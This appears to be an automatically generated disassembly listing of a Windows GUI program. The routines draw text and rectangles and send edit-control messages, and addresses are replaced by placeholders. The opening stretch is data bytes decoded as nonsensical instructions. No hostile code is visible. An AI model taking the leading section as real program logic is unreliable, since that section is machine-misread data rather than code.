jb r-xdata
mov esp 0xe80043
add bh bh
call 0x2424ddd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0023 ] al
outsb
popad
outsb
popad
jb r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
int3
mov edi 0x1000043
add bh bh
add [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ ebx ] cl
dec edi
outsb
push ebx
je r-xdata
insb
bound edx [ esi + 0x69 ]
jb r-xdata
jb r-xdata
cmp [ ebx + 0xd80043 ] 0x0
adc eax 0x47424c54
jne r-xdata
popad
je r-xdata
outsb
inc ebp
js r-xdata
add bh bh
enter 0x1 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] al
push es
dec edi
outsb
add [ eax ] al
add [ eax + 0x4f090025 ] al
outsd
outsb
je r-xdata
outsb
or [ edi ] al
adc [ edx + 0x4f ] ch
ja r-xdata
popad
jb r-xdata
inc ebx
inc esp
jb r-xdata
push 0x65
popad
je r-xdata
add [ eax + edx + 0x40 ] dl
add ah cl
adc [ eax ] al
insb
dec edi
jb r-xdata
je r-xdata
outsb
push ebx
je r-xdata
outsd
insb
or edx [ edi + edx * 2 + 0x69 ]
outsb
inc ebx
outsd
outsb
je r-xdata
inc ebx
outsd
outsb
je r-xdata
add ecx [ eax ]
pop es
js r-xdata
outsd
outsb
je r-xdata
jb r-xdata
push esp
dec esp
inc edx
inc edi
imul edi [ eax + 0x65 ] 0x626c1364
dec edi
ja r-xdata
jb r-xdata
inc esp
outsd
inc ebp
jbe r-xdata
insb
jae r-xdata
je r-xdata
ror [ bx + 0x43 ] 0x1
push ebx
inc ebx
add [ edx + eax ] bh
add al ch
aam 0x43
add [ edx + eax + 0x34700042 ] ch
inc eax
add [ eax ] al
cld
inc ecx
add [ eax + 0x34 ] bh
inc eax
outsb
je r-xdata
inc esp
popad
je r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x76 ] si
outsb
je r-xdata
jb r-xdata
int3
imul ebp [ esi + 0x67 ] 0x72745306
outsb
outsd
insb
add [ 0x65646e49 ] al
or [ edx ] ecx
inc esp
dec ecx
outsb
je r-xdata
popad
outsd
insb
add [ 0x65646e49 ] al
js r-xdata
je r-xdata
dec eax
push eax
inc ebx
jb r-xdata
int3
popad
je r-xdata
jb r-xdata
jb r-xdata
inc esp
popad
bound ebp [ ebp + 0x9 ]
insb
bound edx [ esi + 0x69 ]
jb r-xdata
inc ebx
outsd
outsb
je r-xdata
je r-xdata
outsb
add [ ebx ] al
or eax 0x73694c54
je r-xdata
inc ebx
add [ eax ] cl
andps xmm1 [ edx + eax * 2 + 0x47 ]
ror [ eax + 0x50 ] 0x43
je r-xdata
dec esp
inc edx
inc edi
or [ edi ] al
add cl [ eax ]
pop es
add [ eax ] al
mov dh 0x52
inc ebx
add [ esi ] bl
inc ebp
jbe r-xdata
add ecx [ eax ]
pop es
inc ebx
je r-xdata
lea eax [ eax ]
mov al [ 0x8004350 ]
ja r-xdata
add ah cl
inc ebx
xor [ eax ] eax
lodsb [ esi ]
mov [ ebx ] eax
fdivr [ ebx + 0x44 ]
adc [ eax ] al
add [ ecx * 8 + 0x10cc0043 ] ah
inc eax
add [ ebp + 0x51a40040 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + edx * 2 + 0x53340043 ] ah
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x1e004352 ] dh
inc esp
add [ eax - 0x59 ] al
inc ecx
jb r-xdata
jb r-xdata
arpl [ eax + eax + 0x24 ] si
int 0x43
add [ eax + edx + 0x40 ] dl
add [ ecx + edx + 0x40 ] bl
add [ ebx + 0x435104c0 ] cl
dec edi
bound ebp [ edx + 0x65 ]
pop es
dec ecx
outsb
je r-xdata
jb r-xdata
popad
je r-xdata
add [ esp + eax * 2 ] eax
dec ecx
outsb
insb
or edx [ edi + edx * 2 + 0x69 ]
outsb
inc ebx
outsd
ja r-xdata
inc ebp
add al 0x44
jbe r-xdata
jb r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ gs : edi + eax + 0x54 ] si
push es
inc eax
add [ ebp + 0x50a00040 ] cl
inc ebx
add [ eax ] cl
jne r-xdata
add [ esp + ecx * 2 ] al
inc esp
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ ecx + ecx * 4 + 0x7bdc0043 ] ch
inc esp
xor al 0x40
outsd
insb
or edx [ edi + edx * 2 + 0x69 ]
outsb
inc ebx
outsd
outsb
je r-xdata
mov eax eax
push ebx
je r-xdata
arpl [ edi + eax + 0x54 ] si
or al [ ecx + 0x74 ]
popad
js r-xdata
ja r-xdata
add [ eax ] cl
adc [ esp + ecx * 2 + 0x42 ] dl
inc esi
imul ebp [ esi + 0x64 ] 0x61746144
adc [ eax ] eax
mov eax eax
add al 0x51
inc ebx
imul ebp [ esi + 0x67 ] 0x43cd2400
push ebx
je r-xdata
ja r-xdata
insb
adc ch [ edx + 0x56 ]
imul esi [ edx + 0x74 ] 0x4f6c6175
outsd
insb
add [ edx ] cl
inc esi
imul ebp [ esi + 0x64 ] 0x69727453
outsb
push es
push ebx
je r-xdata
je r-xdata
inc ebx
popad
add [ eax + 0x29 ] ah
inc esp
add [ ebp + edi * 8 + 0x43 ] dh
add [ eax - 0x73ffbbd0 ] al
push es
inc esp
add ah al
add al [ edx ]
lodsb [ esi ]
inc [ ecx ]
movsb [ edi ] [ esi ]
inc [ ecx ]
int3
imul ebp [ esi + 0x67 ] 0x746e4907
sub_43679d
call sub_403540
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_448d28
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0xb9
mov eax esi
call sub_440060
mov edx 0x69
mov eax esi
call sub_440084
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_4367f0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4430f8
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x208 ]
call sub_423cec
mov edx r-xdata
mov eax [ ebx + 0x208 ]
call sub_423c48
add [ esi + 0x4 ] eax
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
pop esi
pop ebx
retn
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
sub_43685c
push ebp
mov ebp esp
mov ecx 0x11
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_436bfe
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x208 ]
mov edx [ ebx + 0x68 ]
mov eax edi
call sub_423cec
call sub_432154
call sub_432234
test al al
je r-xdata
mov edx r-xdata
mov eax edi
call sub_423c48
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ ebp - 0x1d ]
push eax
mov edx [ ebp - 0x4 ]
sar edx 0x1
jns r-xdata
lea edx [ ebp - 0x50 ]
mov eax ebx
call sub_4408a4
cmp [ ebp - 0x50 ] 0x0
je r-xdata
dec edx
mov ecx [ ebx + 0x48 ]
xor eax eax
call sub_418d68
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
adc edx 0x0
push 0x0
lea eax [ ebp - 0x2d ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_418d68
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x54 ]
mov eax ebx
call sub_4408a4
mov eax [ ebp - 0x54 ]
call sub_40422c
push eax
lea edx [ ebp - 0x58 ]
mov eax ebx
call sub_4408a4
mov eax [ ebp - 0x58 ]
call sub_40442c
push eax
mov eax edi
call sub_423dcc
push eax
call GetTextExtentPoint32A
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
mov ecx [ ebp - 0xc ]
xor edx edx
xor eax eax
call sub_418d68
mov eax ebx
mov si 0xffc8
call sub_403418
test al al
jne r-xdata
mov edx 0xff000006
mov eax [ edi + 0x14 ]
call sub_423684
inc [ ebp - 0x1d ]
inc [ ebp - 0x19 ]
mov edx 0xff000014
mov eax [ edi + 0x14 ]
call sub_423684
lea edx [ ebp - 0x1d ]
mov eax edi
call sub_423a64
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x1d ]
push eax
call OffsetRect
mov edx 0xff000010
mov eax [ edi + 0x14 ]
call sub_423684
jmp r-xdata
mov [ ebp - 0x39 ] eax
mov eax [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x25 ]
push eax
mov eax [ ebp - 0x29 ]
push eax
mov eax [ ebp - 0x2d ]
push eax
mov eax edi
call sub_423dcc
push eax
call ExcludeClipRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
adc eax 0x0
push 0x0
mov eax [ ebx + 0x48 ]
sub eax 0x8
sub eax [ ebp - 0x25 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
call OffsetRect
jmp r-xdata
push 0x0
push 0x8
lea eax [ ebp - 0x2d ]
push eax
call OffsetRect
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436c05
lea eax [ ebp - 0x8c ]
mov edx 0x5
call sub_403f90
lea eax [ ebp - 0x68 ]
mov edx 0x2
call sub_403f90
lea eax [ ebp - 0x60 ]
call sub_404678
lea eax [ ebp - 0x5c ]
mov edx 0x4
call sub_403f90
retn
mov eax ebx
mov si 0xffc8
call sub_403418
test al al
jne r-xdata
lea edx [ ebp - 0x1d ]
mov eax edi
call sub_423a64
lea edx [ ebp - 0x68 ]
mov eax ebx
call sub_4408a4
cmp [ ebp - 0x68 ] 0x0
je r-xdata
mov [ ebp - 0xd ] 0x1c
mov [ ebp - 0xd ] 0x1b
jmp r-xdata
lea edx [ ebp - 0x3d ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x21 ]
sub eax [ ebp - 0x29 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x78 ]
push eax
lea edx [ ebp - 0x7c ]
mov eax ebx
call sub_4408a4
mov edx [ ebp - 0x7c ]
mov eax [ ebx + 0x208 ]
call sub_423c2c
push eax
mov eax [ ebp - 0x15 ]
pop edx
sub eax edx
sub eax 0x8
xor ecx ecx
xor edx edx
call sub_418d68
push edi
lea esi [ ebp - 0x78 ]
lea edi [ ebp - 0x1d ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x1d ]
push eax
xor ecx ecx
xor edx edx
mov eax 0x8
call sub_418d68
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax ebx
call sub_4408a4
mov edx [ ebp - 0x64 ]
lea eax [ ebp - 0x60 ]
call sub_4047c4
mov eax [ ebp - 0x60 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
push 0x0
push 0x0
mov eax edi
call sub_423dcc
push eax
call sub_432154
lea ecx [ ebp - 0x4c ]
pop edx
call sub_43239c
jmp r-xdata
call sub_432154
lea ecx [ ebp - 0x4c ]
mov dl [ ebp - 0xd ]
call sub_432400
lea eax [ ebp - 0x3d ]
push eax
push 0x0
mov eax edi
call sub_423dcc
push eax
call sub_432154
lea ecx [ ebp - 0x4c ]
pop edx
call sub_4322f0
push 0x0
mov eax edi
call sub_423dcc
push eax
call SelectClipRgn
lea edx [ ebp - 0x5c ]
mov eax ebx
call sub_4408a4
cmp [ ebp - 0x5c ] 0x0
je r-xdata
mov edx 0x20
mov eax ebx
call sub_442b84
mov esi eax
mov eax esi
or eax 0x400
push eax
lea eax [ ebp - 0x1d ]
push eax
lea edx [ ebp - 0x80 ]
mov eax ebx
call sub_4408a4
mov eax [ ebp - 0x80 ]
call sub_40422c
push eax
lea edx [ ebp - 0x84 ]
mov eax ebx
call sub_4408a4
mov eax [ ebp - 0x84 ]
call sub_40442c
push eax
mov eax edi
call sub_423dcc
push eax
call DrawTextA
mov edx [ ebx + 0x70 ]
mov eax [ edi + 0x14 ]
call sub_423684
push esi
lea eax [ ebp - 0x1d ]
push eax
lea edx [ ebp - 0x88 ]
mov eax ebx
call sub_4408a4
mov eax [ ebp - 0x88 ]
call sub_40422c
push eax
lea edx [ ebp - 0x8c ]
mov eax ebx
call sub_4408a4
mov eax [ ebp - 0x8c ]
call sub_40442c
push eax
mov eax edi
call sub_423dcc
push eax
call DrawTextA
sub_436c0f
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_436c8a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4408a4
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_457668
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_446510
mov eax ebx
mov si 0xffb8
call sub_403418
test al al
je r-xdata
mov eax ebx
call sub_447624
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436c91
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_436cdc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4482ec
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x41
mov eax esi
call sub_440060
mov edx 0x11
mov eax esi
call sub_440084
mov [ esi + 0x16d ] 0x1
mov [ esi + 0x170 ] 0x1
call sub_432154
call sub_432234
test al al
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
mov eax esi
test bl bl
je r-xdata
sub_436d88
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_436ede
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x90 ]
test esi 0x400
je r-xdata
cmp [ ebx + 0x170 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_442b84
mov esi eax
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x160 ]
call sub_423cec
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
or esi 0x800
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404234
cmp [ ebx + 0x170 ] 0x0
je r-xdata
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_40422c
push eax
mov eax [ ebp - 0x4 ]
call sub_40442c
push eax
mov eax [ ebx + 0x160 ]
call sub_423dcc
push eax
call DrawTextA
push 0x1
push 0x1
push edi
call OffsetRect
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_422eb8
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_40422c
push eax
mov eax [ ebp - 0x4 ]
call sub_40442c
push eax
mov eax [ ebx + 0x160 ]
call sub_423dcc
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
push edi
call OffsetRect
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_422eb8
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_40422c
push eax
mov eax [ ebp - 0x4 ]
call sub_40442c
push eax
mov eax [ ebx + 0x160 ]
call sub_423dcc
push eax
call DrawTextA
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x26
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436ee5
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
sub_436eef
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xffffffd0
mov ebx eax
mov esi [ ebx + 0x160 ]
mov eax ebx
call sub_437118
test al al
jne r-xdata
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_4237a0
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
xor eax eax
mov al [ ebx + 0x16f ]
mov di [ eax * 2 + rw-data ]
or di 0x40
xor eax eax
mov al [ ebx + 0x16c ]
or di [ eax * 2 + rw-data ]
movzx edi di
cmp [ ebx + 0x16e ] 0x0
je r-xdata
mov edx [ ebx + 0x70 ]
mov eax [ esi + 0x14 ]
call sub_423684
xor edx edx
mov eax [ esi + 0x14 ]
call sub_4237a0
lea edx [ esp + 0x20 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ esp + 0x20 ]
mov eax esi
call sub_423a28
mov edx esp
mov ecx edi
mov eax ebx
mov si 0xffc6
call sub_403418
add esp 0x30
pop edi
pop esi
pop ebx
retn
push edi
lea esi [ esp + 0x4 ]
lea edi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov ecx edi
or ecx 0x400
lea edx [ esp + 0x10 ]
mov eax ebx
mov si 0xffc6
call sub_403418
cmp [ ebx + 0x16e ] 0x2
jne r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x1c ]
sar eax 0x1
jns r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x1c ]
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
jmp r-xdata
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
adc eax 0x0
sub_437010
push ebx
push esi
push edi
add esp 0xffffffec
mov edi eax
test [ edi + 0x1c ] 0x2
jne r-xdata
add esp 0x14
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x16d ] 0x0
je r-xdata
lea edx [ esp + 0x1 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
push 0x0
call GetDC
mov ebx eax
mov edx ebx
mov eax [ edi + 0x160 ]
call sub_423e4c
xor eax eax
mov al [ edi + 0x16f ]
mov cx [ eax * 2 + rw-data ]
or cx 0x440
movzx ecx cx
lea edx [ esp + 0x1 ]
mov eax edi
mov si 0xffc6
call sub_403418
xor edx edx
mov eax [ edi + 0x160 ]
call sub_423e4c
push ebx
push 0x0
call ReleaseDC
mov ebx [ edi + 0x40 ]
mov al [ edi + 0x16c ]
mov [ esp ] al
mov eax edi
mov si 0xffc8
call sub_403418
test al al
je r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax esp
call sub_43d684
mov eax [ esp + 0x9 ]
push eax
mov eax [ esp + 0x11 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ edi + 0x48 ]
sub eax [ esp + 0x9 ]
add ebx eax
sub_437154
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_437118
cmp bl al
je r-xdata
mov [ esi + 0x188 ] 0x1
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4371b4
push esi
push edi
mov edi eax
cmp dl [ edi + 0x16f ]
je r-xdata
pop edi
pop esi
retn
mov [ edi + 0x16f ] dl
mov eax edi
mov si 0xffc7
call sub_403418
mov eax edi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4371dc
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_43fd74
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x168 ]
jne r-xdata
xor eax eax
mov [ edi + 0x168 ] eax
sub_437240
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4372cd
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x168 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4372d4
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ ebx + 0x170 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4408a4
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_457668
test al al
je r-xdata
mov ebx [ ebx + 0x168 ]
mov eax ebx
mov si 0xffb8
call sub_403418
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov [ edi + 0xc ] 0x1
sub_437324
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_442db8
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
mov edx 0x79
mov eax esi
call sub_440060
mov edx 0x19
mov eax esi
call sub_440084
mov dl 0x1
mov eax esi
call sub_4472f8
xor edx edx
mov eax esi
call sub_440a68
mov [ esi + 0x20c ] 0x1
mov [ esi + 0x20f ] 0x1
mov [ esi + 0x210 ] 0x1
mov [ esi + 0x211 ] 0x1
mov eax esi
call sub_437a34
mov eax esi
test bl bl
je r-xdata
sub_4373cc
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0xc5
mov eax ebx
call sub_4470c4
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_43744c
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x208 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x208 ] esi
mov eax ebx
call sub_4473c8
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc8 ]
sub_437490
push ebx
push esi
mov esi eax
mov bl [ esi + 0x215 ]
mov eax esi
call sub_4473c8
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0xb8
mov eax esi
call sub_4470c4
push eax
call SendMessageA
test eax eax
setne bl
sub_4374c8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_4473c8
test al al
je r-xdata
mov [ esi + 0x215 ] bl
pop esi
pop ebx
retn
push 0x0
xor eax eax
mov al bl
push eax
push 0xb9
mov eax esi
call sub_4470c4
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_437500
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_43757d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp dl [ ebx + 0x20d ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437584
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
mov [ ebx + 0x20d ] dl
mov eax ebx
call sub_4473c8
test al al
je r-xdata
push 0x0
xor eax eax
mov al [ ebx + 0x20d ]
push eax
push 0xcc
mov eax ebx
call sub_4470c4
push eax
call SendMessageA
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4408a4
mov eax [ ebp - 0x4 ]
call sub_40442c
mov edx eax
mov eax ebx
call sub_440880
sub_437588
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x20e ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x20e ] bl
mov eax esi
call sub_4473c8
test al al
je r-xdata
push 0x0
xor eax eax
mov al bl
push eax
push 0xcf
mov eax esi
call sub_4470c4
push eax
call SendMessageA
sub_4375c4
push ebx
push ecx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_4470c4
push eax
call SendMessageA
mov eax [ esp ]
pop edx
pop ebx
retn
sub_4375e8
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push esi
push 0xb1
mov eax ebx
call sub_4470c4
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_437608
push ebx
add esp 0xfffffff8
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_4470c4
push eax
call SendMessageA
mov eax [ esp + 0x4 ]
sub eax [ esp ]
pop ecx
pop edx
pop ebx
retn
sub_437638
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_4470c4
push eax
call SendMessageA
add esi [ esp ]
mov [ esp + 0x4 ] esi
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push 0xb1
mov eax ebx
call sub_4470c4
push eax
call SendMessageA
push 0x0
push 0x0
push 0xb7
mov eax ebx
call sub_4470c4
push eax
call SendMessageA
pop ecx
pop edx
pop esi
pop ebx
retn
sub_4376d4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
mov esi eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_440818
inc eax
call sub_408a7c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_43775e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_408a90
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_440828
cmp edi [ ebp - 0x8 ]
jg r-xdata
mov edx [ ebp - 0xc ]
add edx esi
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4088f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437765
mov eax [ ebp - 0xc ]
call sub_408ac8
retn
dec edi
mov [ ebp - 0x8 ] edi
sub_437770
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
mov [ ebp - 0x8 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov esi eax
mov eax edi
mov ecx esi
xor edx edx
call sub_40405c
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax ebx
call sub_440818
inc eax
call sub_408a7c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4377fe
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_408a90
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_440828
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
add eax edx
mov edx [ edi ]
mov ecx esi
call sub_402988
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_408ac8
retn
sub_43780c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_443f18
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_443e44
mov eax [ esi + 0x4 ]
or eax 0xc0
xor edx edx
mov dl [ ebx + 0x20c ]
or eax [ edx * 4 + rw-data ]
cmp [ ebx + 0x20d ] 0x0
setne dl
and edx 0x7f
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x20e ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x213 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x211 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x212 ]
or eax [ edx * 4 + rw-data ]
mov [ esi + 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x20c ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
sub_4378c5
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xffffff74
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax ebx
call sub_444214
mov eax [ rw-data ]
cmp [ eax ] 0x2
je r-xdata
test [ edx + 0x5 ] 0x8
